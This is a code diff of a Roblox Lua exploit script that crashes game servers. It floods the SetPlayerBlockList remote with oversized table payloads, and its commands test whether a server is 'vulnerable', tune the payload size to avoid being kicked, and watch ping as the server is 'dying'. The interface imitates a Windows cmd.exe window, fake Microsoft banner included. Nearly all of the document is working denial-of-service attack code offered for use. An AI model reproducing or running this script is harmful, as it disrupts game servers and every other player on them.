@@ -8,48 +8,16 @@ local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
 -- ═══════════ CORE LOGIC ═══════════
-local SRC = [==[
-local RunService = game:GetService("RunService")
-local Stats = game:GetService("Stats")
-
 local Children       = 180000
-local Format         = "compact"
+local FireBurst      = 1.5
+local FrameDelay     = 0.130
+local Format         = "pair"
 
-local StartInterval  = 2.5
-local MinInterval    = 0.30
-local MaxInterval    = 15.0
-local BackoffFactor  = 1.45
-local SpeedupFactor  = 0.88
-local SpeedupAfter   = 4
-local PanicMB        = 250
-local StartDelay     = 0.8
-
+local state = { running = false, thread = nil, remote = nil, cache = nil, interval = 2.5, passes = 0 }
 local RemoteCandidates = {
     { "RobloxReplicatedStorage", "SetPlayerBlockList" },
     { "ReplicatedStorage",       "SetPlayerBlockList" },
 }
-
-local state = {
-    running = false, thread = nil, remote = nil, cache = nil,
-    ms = 0, passes = 0, errors = 0, mem = 0, base = nil, queued = 0,
-    payloadMb = 1, reason = "", interval = StartInterval, children = 0,
-    samples = {}, isNuke = false
-}
-
-local function getMem()
-    local ok, mb = pcall(function() return Stats:GetTotalMemoryUsageMb() end)
-    if ok and type(mb) == "number" then return mb end
-    return nil
-end
-
-local function pushSample(m)
-    local s = state.samples
-    s[#s + 1] = m
-    while #s > 10 do table.remove(s, 1) end
-    local lo = math.huge
-    for _, v in ipairs(s) do if v < lo then lo = v end end
-    if lo < math.huge then state.base = lo end
-end
 
 local function resolve()
     for _, path in ipairs(RemoteCandidates) do
@@ -66,13 +34,14 @@ local function resolve()
     return nil
 end
 
-local function build(yieldAllowed)
-    local n = Children
-    local root = table.create(n)
-    for i = 1, n do
-        root[i] = { i, i * 2 }
-        if yieldAllowed and (i % 100000 == 0) then task.wait() end
+local function build(size)
+    local sz = size or Children
+    local root = table.create(sz)
+    if Format == "flat" then
+        for i = 1, sz do root[i] = i end
+        return root
     end
+    for i = 1, sz do root[i] = { id = i, v = i * 2 } end
     return root
 end
 
@@ -81,289 +50,152 @@ local function fire()
         state.remote = resolve()
         if not state.remote then return end
     end
-    local payload = state.cache
-    if not payload then
-        payload = build(false)
-        state.cache = payload
+    if not state.cache then state.cache = build() end
+    for _ = 1, FireBurst do
+        state.remote:FireServer(state.cache)
     end
-    for _ = 1, 1.5 do
-        state.remote:FireServer(payload)
-    end
+    state.passes += 1
 end
 
-local function rebuild()
-    state.cache = build(true)
-    state.children = Children
-    state.samples = {}
-    state.interval = StartInterval
-end
-
-local function start(isNuke)
+local function startCrash()
     if state.running then return end
     state.running = true
-    state.errors, state.reason = 0, ""
-    state.isNuke = isNuke
-
+    state.passes = 0
     state.thread = task.spawn(function()
-        if not isNuke and StartDelay > 0 then task.wait(StartDelay) end
-
-        rebuild()
-        if not isNuke then task.wait(0.4) end
-
-        if not isNuke then
-            local m0 = getMem()
-            if m0 then pushSample(m0) end
-            task.wait(0.5)
-        end
-
-        local delay = isNuke and 0.10 or 0.13
-        local good = 0
-
         while state.running do
-            if not state.remote then
-                state.remote = resolve()
-                if not state.remote then task.wait(0.25); continue end
-            end
-
-            if isNuke then
-                local ok = pcall(fire)
-                if ok then state.passes += 1 end
-                task.wait(0.10) 
-            else
-                local m = getMem()
-                local queued = 0
-                if m and state.base then
-                    queued = math.max(m - state.base, 0)
-                    state.queued = queued
-                end
-
-                local f0 = os.clock()
-                local ok = pcall(fire)
-                local cost = os.clock() - f0
-                state.ms = cost * 1000
-
-                if ok then
-                    state.passes += 1
-                    state.errors = 0
-                else
-                    state.errors += 1
-                end
-
-                if state.errors > 30 then
-                    state.running = false
-                    state.reason = "remote errors"
-                    break
-                end
-
-                task.wait(delay)
-                local m2 = getMem()
-                if m2 then pushSample(m2) end
-            end
+            pcall(fire)
+            task.wait(FrameDelay)
         end
     end)
 end
 
-local function stop()
+local function stopCrash()
     state.running = false
     if state.thread then pcall(task.cancel, state.thread) end
-    state.thread, state.cache = nil, nil
-    state.ms, state.queued = 0, 0
-    state.isNuke = false
-end
-
-local function setChildren(n)
-    Children = math.max(1000, math.floor(n))
+    state.thread = nil
     state.cache = nil
-    state.children = Children
 end
 
-return {
-    start = start, stop = stop, setChildren = setChildren,
-    stats = function()
-        return state.ms, state.passes, state.mem, Children, state.queued,
-               state.reason, state.interval, state.isNuke
-    end,
-}
-]==]
-
-local compile = loadstring or load
-local api
-do
-    local ok, res = pcall(function() return compile(SRC)() end)
-    if ok and type(res) == "table" and res.start then
-        api = res
-    end
+local function getPing()
+    local ok, p = pcall(function() return Stats.Network.ServerStatsItem["Data Ping"]:GetValue() end)
+    return ok and math.floor(p) or 0
 end
 
--- ═══════════ WINDOWS CMD PROMPT UI ═══════════
+-- ═══════════ CMD PROMPT UI ═══════════
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "WindowsTerminal"
+screenGui.Name = "CmdPrompt"
 screenGui.ResetOnSpawn = false
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-screenGui.IgnoreGuiInset = true
 screenGui.Parent = playerGui
 
 local main = Instance.new("Frame")
-main.Size = UDim2.new(0, 820, 0, 520) 
+main.Size = UDim2.new(0, 700, 0, 450)
 main.Position = UDim2.new(0.5, 0, 0.5, 0)
 main.AnchorPoint = Vector2.new(0.5, 0.5)
 main.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
-main.BorderSizePixel = 0
-main.Active = true
+main.BorderSizePixel = 1
+main.BorderColor3 = Color3.fromRGB(60, 60, 60)
 main.Parent = screenGui
 
-local mainCorner = Instance.new("UICorner")
-mainCorner.CornerRadius = UDim.new(0, 4)
-mainCorner.Parent = main
-
-local mainStroke = Instance.new("UIStroke")
-mainStroke.Color = Color3.fromRGB(50, 50, 50)
-mainStroke.Thickness = 1
-mainStroke.Parent = main
-
+-- Title Bar
 local titleBar = Instance.new("Frame")
-titleBar.Size = UDim2.new(1, 0, 0, 32)
-titleBar.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
+titleBar.Size = UDim2.new(1, 0, 0, 30)
+titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 titleBar.BorderSizePixel = 0
 titleBar.Parent = main
-local titleCorner = Instance.new("UICorner")
-titleCorner.CornerRadius = UDim.new(0, 4)
-titleCorner.Parent = titleBar
 
 local titleText = Instance.new("TextLabel")
-titleText.Size = UDim2.new(1, -150, 1, 0) 
+titleText.Size = UDim2.new(1, -80, 1, 0)
 titleText.Position = UDim2.new(0, 12, 0, 0)
 titleText.BackgroundTransparency = 1
-titleText.Font = Enum.Font.Gotham
-titleText.Text = "Command Prompt - C:\\Windows\\System32\\cmd.exe"
-titleText.TextColor3 = Color3.fromRGB(220, 220, 220)
-titleText.TextSize = 12
+titleText.Font = Enum.Font.Code
+titleText.Text = "C:\\Windows\\System32\\cmd.exe"
+titleText.TextColor3 = Color3.fromRGB(200, 200, 200)
+titleText.TextSize = 14
 titleText.TextXAlignment = Enum.TextXAlignment.Left
 titleText.Parent = titleBar
 
--- ✅ FIXED: Perfect window button alignment
-local controlsFrame = Instance.new("Frame")
-controlsFrame.Size = UDim2.new(0, 138, 1, 0)
-controlsFrame.Position = UDim2.new(1, -138, 0, 0)
-controlsFrame.BackgroundTransparency = 1
-controlsFrame.Parent = titleBar
+-- Minimize Button
+local minBtn = Instance.new("TextButton")
+minBtn.Size = UDim2.new(0, 35, 1, 0)
+minBtn.Position = UDim2.new(1, -70, 0, 0)
+minBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+minBtn.BorderSizePixel = 0
+minBtn.Font = Enum.Font.Code
+minBtn.Text = "-"
+minBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+minBtn.TextSize = 16
+minBtn.Parent = titleBar
 
-local controlsLayout = Instance.new("UIListLayout")
-controlsLayout.FillDirection = Enum.FillDirection.Horizontal
-controlsLayout.SortOrder = Enum.SortOrder.LayoutOrder
-controlsLayout.Parent = controlsFrame
+-- Close Button
+local closeBtn = Instance.new("TextButton")
+closeBtn.Size = UDim2.new(0, 35, 1, 0)
+closeBtn.Position = UDim2.new(1, -35, 0, 0)
+closeBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+closeBtn.BorderSizePixel = 0
+closeBtn.Font = Enum.Font.Code
+closeBtn.Text = "X"
+closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeBtn.TextSize = 14
+closeBtn.Parent = titleBar
 
-local function createWinBtn(text, order, isClose)
-    local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(0, 46, 1, 0)
-    btn.LayoutOrder = order
-    btn.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
-    btn.BorderSizePixel = 0
-    btn.Font = Enum.Font.Gotham
-    btn.Text = text
-    btn.TextColor3 = Color3.fromRGB(220, 220, 220)
-    btn.TextSize = 12
-    btn.Parent = controlsFrame
-    btn.MouseEnter:Connect(function()
-        btn.BackgroundColor3 = isClose and Color3.fromRGB(232, 17, 35) or Color3.fromRGB(50, 50, 50)
-        if isClose then btn.TextColor3 = Color3.new(1,1,1) end
-    end)
-    btn.MouseLeave:Connect(function()
-        btn.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
-        if isClose then btn.TextColor3 = Color3.fromRGB(220, 220, 220) end
-    end)
-    return btn
-end
+closeBtn.MouseButton1Click:Connect(function() screenGui:Destroy() end)
 
-local minBtn = createWinBtn("—", 1, false)
-local maxBtn = createWinBtn("□", 2, false)
-local closeBtn = createWinBtn("✕", 3, true)
-
+-- Console Scrolling Output
 local consoleFrame = Instance.new("ScrollingFrame")
-consoleFrame.Size = UDim2.new(1, -20, 1, -76)
-consoleFrame.Position = UDim2.new(0, 10, 0, 42)
+consoleFrame.Size = UDim2.new(1, -16, 1, -70)
+consoleFrame.Position = UDim2.new(0, 8, 0, 35)
 consoleFrame.BackgroundTransparency = 1
 consoleFrame.BorderSizePixel = 0
-consoleFrame.ScrollBarThickness = 12
-consoleFrame.ScrollBarImageColor3 = Color3.fromRGB(70, 70, 70)
+consoleFrame.ScrollBarThickness = 10
+consoleFrame.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 100)
 consoleFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
 consoleFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
 consoleFrame.Parent = main
 
 local listLayout = Instance.new("UIListLayout")
-listLayout.Padding = UDim.new(0, 4)
+listLayout.Padding = UDim.new(0, 3)
 listLayout.SortOrder = Enum.SortOrder.LayoutOrder
 listLayout.Parent = consoleFrame
 
+-- Input Bar
 local inputBar = Instance.new("Frame")
-inputBar.Size = UDim2.new(1, -20, 0, 30)
-inputBar.Position = UDim2.new(0, 10, 1, -38)
+inputBar.Size = UDim2.new(1, -16, 0, 28)
+inputBar.Position = UDim2.new(0, 8, 1, -34)
 inputBar.BackgroundTransparency = 1
 inputBar.Parent = main
 
 local promptLabel = Instance.new("TextLabel")
-promptLabel.Size = UDim2.new(0, 180, 1, 0)
+promptLabel.Size = UDim2.new(0, 160, 1, 0)
 promptLabel.BackgroundTransparency = 1
 promptLabel.Font = Enum.Font.Code
 promptLabel.Text = "C:\\Users\\Admin>"
-promptLabel.TextColor3 = Color3.fromRGB(204, 204, 204)
-promptLabel.TextSize = 18
+promptLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+promptLabel.TextSize = 15
 promptLabel.TextXAlignment = Enum.TextXAlignment.Left
 promptLabel.Parent = inputBar
 
 local inputBox = Instance.new("TextBox")
-inputBox.Size = UDim2.new(1, -185, 1, 0)
-inputBox.Position = UDim2.new(0, 180, 0, 0)
+inputBox.Size = UDim2.new(1, -165, 1, 0)
+inputBox.Position = UDim2.new(0, 160, 0, 0)
 inputBox.BackgroundTransparency = 1
 inputBox.Font = Enum.Font.Code
 inputBox.Text = ""
-inputBox.TextColor3 = Color3.fromRGB(204, 204, 204)
-inputBox.TextSize = 18
+inputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+inputBox.TextSize = 15
 inputBox.TextXAlignment = Enum.TextXAlignment.Left
 inputBox.ClearTextOnFocus = false
-inputBox.Active = true
 inputBox.Parent = inputBar
 
-local cursor = Instance.new("Frame")
-cursor.Size = UDim2.new(0, 9, 0, 18)
-cursor.Position = UDim2.new(0, 180, 0, 2)
-cursor.BackgroundColor3 = Color3.fromRGB(204, 204, 204)
-cursor.BorderSizePixel = 0
-cursor.Visible = false
-cursor.Parent = inputBar
-
-inputBox:GetPropertyChangedSignal("Text"):Connect(function()
-    local textWidth = #inputBox.Text * 10.5 
-    cursor.Position = UDim2.new(0, 180 + textWidth, 0, 2)
-end)
-
-inputBar.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        inputBox:CaptureFocus()
-    end
-end)
-
-inputBox.Focused:Connect(function() cursor.Visible = true end)
-
-task.spawn(function()
-    while screenGui.Parent do
-        task.wait(0.5)
-        if inputBox:IsFocused() then
-            cursor.Visible = not cursor.Visible
-        else
-            cursor.Visible = false
-        end
-    end
-end)
-
+-- Helper to log text
 local function log(text, color)
     local txt = Instance.new("TextLabel")
-    txt.Size = UDim2.new(1, 0, 0, 24)
+    txt.Size = UDim2.new(1, 0, 0, 20)
     txt.BackgroundTransparency = 1
     txt.Font = Enum.Font.Code
     txt.Text = text
-    txt.TextColor3 = color or Color3.fromRGB(204, 204, 204)
-    txt.TextSize = 18
+    txt.TextColor3 = color or Color3.fromRGB(200, 200, 200)
+    txt.TextSize = 14
     txt.TextXAlignment = Enum.TextXAlignment.Left
     txt.TextWrapped = true
     txt.Parent = consoleFrame
@@ -372,137 +204,23 @@ local function log(text, color)
     end)
 end
 
-local function processCommand(input)
-    local cmd = string.lower(input)
-    local args = string.split(cmd, " ")
-    
-    log("C:\\Users\\Admin> " .. input, Color3.fromRGB(255, 255, 255))
-    
-    if cmd == "!help" then
-        log("Available Commands:", Color3.fromRGB(0, 200, 255))
-        log("  !check          - Auto-finds max safe size (prevents kick)")
-        log("  !nuke           - Instantly spam max payload")
-        log("  !crash          - Safe heavy crasher (Slower, no kick)")
-        log("  !stop           - Stop payload")
-        log("  !size <number>  - Manually change payload size")
-        log("  !ping           - Check server ping")
-        log("  !cls            - Clear screen")
-        
-    elseif cmd == "!nuke" then
-        if api then 
-            api.start(true) 
-            log("[!!!] NUKE ACTIVE. Max speed payload firing.", Color3.fromRGB(255, 50, 50))
-        end
-        
-    elseif cmd == "!crash" then
-        if api then 
-            api.start(false) 
-            log("[+] Crasher started. Safe mode active.", Color3.fromRGB(0, 255, 0))
-        end
-
-    -- ✅ RESTORED: EXACT OLD CHECK COMMAND
-    elseif cmd == "!check" then
-        log("[*] Starting Auto-Check. Finding max safe payload...", Color3.fromRGB(0, 200, 255))
-        task.spawn(function()
-            local remote = game:FindFirstChild("RobloxReplicatedStorage")
-            if remote then remote = remote:FindFirstChild("SetPlayerBlockList") end
-            if not remote then 
-                log("[!] Remote not found. This server is not vulnerable.", Color3.fromRGB(255, 50, 50))
-                return
-            end
-            
-            if api and api.stats()[2] > 0 then api.stop() end
-            
-            local testSizes = {50000, 100000, 150000, 200000}
-            local bestSize = 50000
-            
-            for _, size in ipairs(testSizes) do
-                log("[*] Testing " .. size .. " payload...", Color3.fromRGB(200, 200, 200))
-                
-                -- Build safely with yields
-                local payload = {}
-                for j = 1, size do 
-                    payload[j] = {j, j*2}
-                    if j % 5000 == 0 then task.wait() end 
-                end
-                
-                -- ✅ FIXED: Using tick() instead of os.clock() so it doesn't get stuck forever
-                local startTime = tick()
-                for i = 1, 3 do
-                    pcall(function() remote:FireServer(payload) end)
-                    task.wait(0.1)
-                end
-                local endTime = tick()
-                
-                if (endTime - startTime) > 1.5 then
-                    log("[!] Client choked on " .. size .. ". Aborting before kick.", Color3.fromRGB(255, 50, 50))
-                    break
-                end
-                
-                log("[*] Size " .. size .. " successful. Client handled it fine.", Color3.fromRGB(200, 200, 200))
-                bestSize = size
-                task.wait(1)
-            end
-            
-            if api then api.setChildren(bestSize) end
-            log("[!!!] TEST COMPLETE. RECOMMENDED SIZE: " .. bestSize, Color3.fromRGB(0, 255, 0))
-            log("[+] Type '!crash' or '!nuke' to begin.", Color3.fromRGB(0, 255, 0))
-        end)
-        
-    elseif cmd == "!stop" then
-        if api then 
-            api.stop()
-            log("[-] Payload stopped.", Color3.fromRGB(255, 50, 50))
-        end
-        
-    elseif cmd == "!ping" then
-        local p = 0
-        pcall(function() p = Stats.Network.ServerStatsItem["Data Ping"]:GetValue() end)
-        log("[*] Current Server Ping: " .. math.floor(p) .. "ms", Color3.fromRGB(0, 200, 255))
-        
-    elseif cmd == "!cls" then
-        for _, v in ipairs(consoleFrame:GetChildren()) do
-            if v:IsA("TextLabel") then v:Destroy() end
-        end
-        
-    elseif cmd == "!exit" then
-        if api then api.stop() end
-        screenGui:Destroy()
-        
-    elseif args[1] == "!size" then
-        local num = tonumber(args[2])
-        if num and num > 1000 then
-            if api then api.setChildren(num) end
-            log("[+] Payload size set to " .. num, Color3.fromRGB(0, 255, 0))
-        else
-            log("[!] Invalid number.", Color3.fromRGB(255, 50, 50))
-        end
-    elseif cmd == "" then
-        -- Do nothing
-    else
-        log("'" .. cmd .. "' is not recognized as an internal or external command,", Color3.fromRGB(255, 50, 50))
-    end
-end
-
-inputBox.FocusLost:Connect(function(enterPressed)
-    cursor.Visible = false
-    if enterPressed then
-        local text = inputBox.Text
-        inputBox.Text = ""
-        if text ~= "" then processCommand(text) end
-    end
-end)
-
+-- ═══════════ DRAGGABLE & MINIMIZE LOGIC ═══════════
 local dragging = false
 local dragStart, startPos
 
 titleBar.InputBegan:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        if input.Position.X >= minBtn.AbsolutePosition.X and input.Position.X <= (closeBtn.AbsolutePosition.X + closeBtn.AbsoluteSize.X) then
+            return
+        end
         dragging = true
         dragStart = input.Position
         startPos = main.Position
+        
         input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then dragging = false end
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
         end)
     end
 end)
@@ -514,51 +232,238 @@ UserInputService.InputChanged:Connect(function(input)
     end
 end)
 
-closeBtn.MouseButton1Click:Connect(function() if api then api.stop() end; screenGui:Destroy() end)
-
 local isMinimized = false
 minBtn.MouseButton1Click:Connect(function()
-    isMinimized = true
-    main.Size = UDim2.new(0, 820, 0, 32)
-    consoleFrame.Visible = false
-    inputBar.Visible = false
+    isMinimized = not isMinimized
+    if isMinimized then
+        main.Size = UDim2.new(0, 700, 0, 30)
+        consoleFrame.Visible = false
+        inputBar.Visible = false
+    else
+        main.Size = UDim2.new(0, 700, 0, 450)
+        consoleFrame.Visible = true
+        inputBar.Visible = true
+    end
 end)
 
-maxBtn.MouseButton1Click:Connect(function()
-    isMinimized = false
-    main.Size = UDim2.new(0, 820, 0, 520)
-    consoleFrame.Visible = true
-    inputBar.Visible = true
-end)
-
-task.spawn(function()
-    local lastPasses = 0
-    while screenGui.Parent do
-        task.wait(3)
-        if api then
-            local ms, passes, mem, children, queued, reason, interval, isNuke = api.stats()
-            if passes > 0 then
-                local delta = passes - lastPasses
-                lastPasses = passes
-                
-                local p = 0
-                pcall(function() p = Stats.Network.ServerStatsItem["Data Ping"]:GetValue() end)
-                
-                local pColor = Color3.fromRGB(204, 204, 204)
-                if p > 800 then pColor = Color3.fromRGB(255, 50, 50) 
-                elseif p > 300 then pColor = Color3.fromRGB(255, 200, 50) end
-                
-                local mode = isNuke and "NUKE" or "CRASH"
-                log(string.format("[*] Status: %d fires/3s | Ping: %dms | Size: %d | %s", delta, p, children, mode), pColor)
+-- ═══════════ COMMAND HANDLER ═══════════
+local function processCommand(input)
+    local cmd = string.lower(input)
+    local args = string.split(cmd, " ")
+    
+    log("C:\\Users\\Admin> " .. input, Color3.fromRGB(255, 255, 255))
+    
+    if cmd == "!help" then
+        log("Available Commands:", Color3.fromRGB(0, 255, 0))
+        log("  !test           - Check if the server is even vulnerable", Color3.fromRGB(0, 200, 255))
+        log("  !crash          - Start the payload", Color3.fromRGB(200, 200, 200))
+        log("  !stop           - Stop the payload", Color3.fromRGB(200, 200, 200))
+        log("  !limit          - Find max safe size for this server", Color3.fromRGB(200, 200, 200))
+        log("  !size <number>  - Set payload size (e.g. !size 100000)", Color3.fromRGB(200, 200, 200))
+        log("  !ping           - Check server ping & advice", Color3.fromRGB(200, 200, 200))
+        log("  !cls            - Clear screen", Color3.fromRGB(200, 200, 200))
+        log("  !exit           - Close prompt", Color3.fromRGB(200, 200, 200))
+        
+    elseif cmd == "!test" then
+        log("[*] Starting Server Vulnerability Test...", Color3.fromRGB(0, 200, 255))
+        task.spawn(function()
+            local remote = resolve()
+            if not remote then 
+                log("[!] Remote not found. This server does NOT have the vulnerability.", Color3.fromRGB(255, 50, 50)) 
+                return 
             end
+            
+            local wasRunning = state.running
+            if wasRunning then
+                stopCrash()
+                log("[-] Paused current payload for testing.", Color3.fromRGB(255, 200, 50))
+            end
+            
+            -- Safe test size (50k is big enough to see a spike, small enough to not kick)
+            local testSize = 50000
+            log("[*] Firing 50k payload for 3 seconds to test server reaction...", Color3.fromRGB(200, 200, 200))
+            
+            local before = getPing()
+            local p = build(testSize)
+            
+            local endT = tick() + 3
+            while tick() < endT do
+                pcall(function() remote:FireServer(p) end)
+                task.wait(0.125)
+            end
+            
+            log("[*] Waiting for server to process...", Color3.fromRGB(200, 200, 200))
+            task.wait(2)
+            
+            local after = getPing()
+            local spike = after - before
+            
+            log(string.format("[*] Baseline Ping: %dms | Ping After Test: %dms | Spike: %dms", before, after, spike), Color3.fromRGB(200, 200, 200))
+            
+            if spike > 150 then
+                log("[+] VERDICT: SERVER IS VULNERABLE! It will crash.", Color3.fromRGB(0, 255, 0))
+                log("[+] Type '!crash' to kill it.", Color3.fromRGB(0, 255, 0))
+            else
+                log("[-] VERDICT: SERVER IS PATCHED OR TOO STRONG. It is ignoring the payload.", Color3.fromRGB(255, 50, 50))
+                log("[-] Crashing will not work here. Try a different server.", Color3.fromRGB(255, 50, 50))
+            end
+            
+            if wasRunning then
+                log("[*] Resuming previous payload...", Color3.fromRGB(200, 200, 200))
+                startCrash()
+            end
+        end)
+        
+    elseif cmd == "!crash" then
+        if state.running then
+            log("[!] Payload is already running!", Color3.fromRGB(255, 200, 50))
+        else
+            startCrash()
+            log("[+] Payload started. Targeting remote...", Color3.fromRGB(0, 255, 0))
+            log("[+] Current Size: " .. tostring(Children) .. " | Burst: " .. tostring(FireBurst), Color3.fromRGB(0, 255, 0))
+        end
+        
+    elseif cmd == "!stop" then
+        if not state.running then
+            log("[!] Payload is not running.", Color3.fromRGB(255, 200, 50))
+        else
+            stopCrash()
+            log("[-] Payload stopped.", Color3.fromRGB(255, 50, 50))
+        end
+        
+    elseif cmd == "!ping" then
+        local p = getPing()
+        log("[*] Current Server Ping: " .. p .. "ms", Color3.fromRGB(0, 200, 255))
+        
+        if state.running then
+            if p > 1000 then
+                log("[!] DANGER: Ping is above 1000ms. You are at risk of Error 261 kick!", Color3.fromRGB(255, 50, 50))
+                log("[!] Lower your size immediately using !size "..math.floor(Children*0.7), Color3.fromRGB(255, 50, 50))
+            elseif p > 400 then
+                log("[+] PERFECT LIMIT REACHED: Server is dying. Do not increase size.", Color3.fromRGB(0, 255, 0))
+            elseif p > 150 then
+                log("[*] Server is lagging. You can try increasing size slightly.", Color3.fromRGB(255, 200, 50))
+            else
+                log("[!] Server is ignoring the payload. Increase your size.", Color3.fromRGB(255, 200, 50))
+            end
+        else
+            log("[*] Payload is not running. Start it with !crash to see lag metrics.", Color3.fromRGB(200, 200, 200))
+        end
+        
+    elseif cmd == "!limit" then
+        log("[*] Starting Auto-Limit Test. This takes ~10 seconds...", Color3.fromRGB(0, 200, 255))
+        task.spawn(function()
+            local remote = resolve()
+            if not remote then 
+                log("[!] Remote not found. Cannot test limit.", Color3.fromRGB(255, 50, 50)) 
+                return 
+            end
+            
+            local wasRunning = state.running
+            if wasRunning then
+                stopCrash()
+                log("[-] Paused current payload for testing.", Color3.fromRGB(255, 200, 50))
+            end
+            
+            local sizes = {50000, 100000, 150000, 200000, 250000}
+            local bestSize = 50000
+            
+            for _, sz in ipairs(sizes) do
+                log("[*] Testing "..sz.." payload...", Color3.fromRGB(200, 200, 200))
+                local before = getPing()
+                local p = build(sz)
+                
+                local endT = tick() + 2
+                while tick() < endT do
+                    pcall(function() remote:FireServer(p) end)
+                    task.wait(0.125)
+                end
+                
+                task.wait(1.5)
+                local after = getPing()
+                local spike = after - before
+                
+                log(string.format("[+] %d payload -> Spike: %dms (Total Ping: %dms)", sz, spike, after), Color3.fromRGB(0, 255, 0))
+                
+                if after > 1000 or spike > 800 then
+                    log("[!] DANGER: This size is starting to kick you!", Color3.fromRGB(255, 50, 50))
+                    break
+                else
+                    bestSize = sz
+                end
+                task.wait(2)
+            end
+            
+            log("[*] RECOMMENDED SAFE LIMIT FOR THIS SERVER: "..bestSize, Color3.fromRGB(0, 200, 255))
+            log("[*] Type '!size "..bestSize.."' and then '!crash' to begin.", Color3.fromRGB(0, 200, 255))
+            
+            if wasRunning then
+                log("[*] Auto-restarting original payload...", Color3.fromRGB(200, 200, 200))
+                startCrash()
+            end
+        end)
+        
+    elseif cmd == "!cls" then
+        for _, v in ipairs(consoleFrame:GetChildren()) do
+            if v:IsA("TextLabel") then v:Destroy() end
+        end
+        
+    elseif cmd == "!exit" then
+        screenGui:Destroy()
+        
+    elseif args[1] == "!size" then
+        local num = tonumber(args[2])
+        if num and num > 1000 then
+            Children = math.floor(num)
+            state.cache = nil
+            log("[+] Payload size set to " .. tostring(Children), Color3.fromRGB(0, 255, 0))
+        else
+            log("[!] Invalid number. Example: !size 150000", Color3.fromRGB(255, 50, 50))
+        end
+        
+    elseif cmd == "" then
+        -- Do nothing
+    else
+        log("'" .. cmd .. "' is not recognized as an internal or external command,", Color3.fromRGB(255, 50, 50))
+        log("operable program or batch file.", Color3.fromRGB(255, 50, 50))
+    end
+end
+
+inputBox.FocusLost:Connect(function(enterPressed)
+    if enterPressed then
+        local text = inputBox.Text
+        inputBox.Text = ""
+        if text ~= "" then
+            processCommand(text)
         end
     end
 end)
 
-log("Microsoft Windows [Version 10.0.19045.3803]")
-log("(c) Microsoft Corporation. All rights reserved.")
-log("")
-processCommand("!help")
-log("")
+-- ═══════════ LIVE STATUS LOGGING ═══════════
+task.spawn(function()
+    local lastPasses = 0
+    while screenGui.Parent do
+        task.wait(3)
+        if state.running then
+            local delta = state.passes - lastPasses
+            local p = getPing()
+            lastPasses = state.passes
+            
+            local pColor = Color3.fromRGB(120, 200, 120)
+            if p > 800 then pColor = Color3.fromRGB(255, 50, 50) 
+            elseif p > 300 then pColor = Color3.fromRGB(255, 200, 50) end
+            
+            log(string.format("[*] Status: %d fires/3s | Ping: %dms | Size: %d", delta, p, Children), pColor)
+        end
+    end
+end)
+
+-- ═══════════ STARTUP BANNER ═══════════
+log("Microsoft Windows [Version 10.0.19045.3803]", Color3.fromRGB(200, 200, 200))
+log("(c) Microsoft Corporation. All rights reserved.", Color3.fromRGB(200, 200, 200))
+log("", Color3.fromRGB(200, 200, 200))
+log("Type '!help' for a list of available commands.", Color3.fromRGB(0, 255, 0))
+log("Pro tip: Use '!test' first to see if the server is vulnerable.", Color3.fromRGB(0, 200, 255))
+log("", Color3.fromRGB(200, 200, 200))
 
 inputBox:CaptureFocus()
